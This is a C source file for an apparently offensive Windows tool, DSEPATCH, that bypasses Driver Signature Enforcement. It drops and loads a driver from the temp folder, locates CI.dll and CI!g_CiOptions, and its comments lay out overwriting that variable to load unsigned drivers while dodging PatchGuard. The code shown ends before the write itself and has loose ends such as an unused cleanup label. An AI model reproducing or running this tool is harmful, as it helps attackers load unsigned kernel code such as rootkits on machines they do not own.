/*!
 * DSEPATCH (c) Driver Signing Enforcement 
 * Patcher for anything from Windows 8 to
 * present.
!*/
#define _GNU_SOURCE
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "util.h"
#include "ci.h"
#include "intel.h"
#include "service.h"


int main(int argc, char **argv)
{ 
  BOOL  DriverLoaded;
  CHAR *szDriverPath;
  CHAR  szTemporaryFolder[MAX_PATH + 1];
  RtlSecureZeroMemory(&szTemporaryFolder, MAX_PATH + 1);
  if ( GetTempPathA(MAX_PATH, (PCHAR)&szTemporaryFolder) != 0 )
  {
    asprintf
    (
     	&szDriverPath, "%s%s.%s", 
	&szTemporaryFolder, 
	RandomString(5), 
	"sys"
    ); DumpToFile(szDriverPath);

    if ( (DriverLoaded = LoadDriver(szDriverPath)) ) {
      /*!
       * At this point, DSEPATCH (c) is able to use
       * its read / write primitive to overwrite the
       * CI!g_CiOptions variable to load an unsigned
       * driver.
       *
       * We will read the current value (probably 0x6),
       * trigger the write with 0x1, load the driver,
       * and rewrite the variable once again to avoid
       * trigger PatchGuard.
      !*/
      ULONG32 Ci_gOptions_n = 0;
      ULONG32 Ci_gOptions_o = 0;
      LPVOID  Ci_MemoryBase = 0;
      LPVOID  Ci_PtrOptions = 0;
      
      printf("[+] %s loaded successfully\n", szDriverPath);

      Ci_MemoryBase = GetDrvBase("CI.dll");

      printf("[+] CI.DLL @ %p\n", Ci_MemoryBase);

      Ci_PtrOptions = GetCiOptions1(Ci_MemoryBase);

      printf("[+] CI!g_CiOptions @ %p\n", Ci_PtrOptions);

    } else { printf("[ ] LoadDriver 0x%x\n", GetLastError()); };
  };

Cleanup:
  if ( DriverLoaded ) 
	  UnloadDriver(szDriverPath);

  DeleteFileA(szDriverPath);
};
